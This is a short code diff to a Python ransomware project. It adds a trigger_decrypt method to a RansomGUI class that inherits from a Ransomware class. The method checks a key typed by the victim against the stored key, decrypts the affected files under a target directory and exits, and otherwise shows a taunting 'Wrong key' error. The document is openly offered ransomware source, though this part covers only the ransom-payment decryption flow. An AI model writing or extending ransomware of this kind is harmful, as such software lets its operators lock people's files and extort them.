@@ -196,6 +196,31 @@ class RansomGUI(Ransomware):
         messagebox.showerror('ERROR', 'Wrong key man!\n If you are trying to brute-force encryption, then good luck xd\n If not, please enter valid key more carefully')
 
 
+    def trigger_decrypt(self, text_message_callback):
+        possible_key = text_message_callback().strip()
+
+        modules.validate_input.validate_length(possible_key)
+
+        is_key_ok = modules.test_decryption_key.test_decryption_key(self.key_input, possible_key)
+
+        if is_key_ok:
+
+            all_files = self.file_generator(
+                self.starting_dir_test,
+                self.extensions_to_decrypt
+            )
+
+            for f in all_files:
+                try:
+                    modules.cryptography.decrypt(possible_key, f)
+                except StopIteration:
+                    pass
+
+            sys.exit(0)
+
+        else:
+            self.throw_error_message()
+
 
 if __name__ == '__main__':
     pass
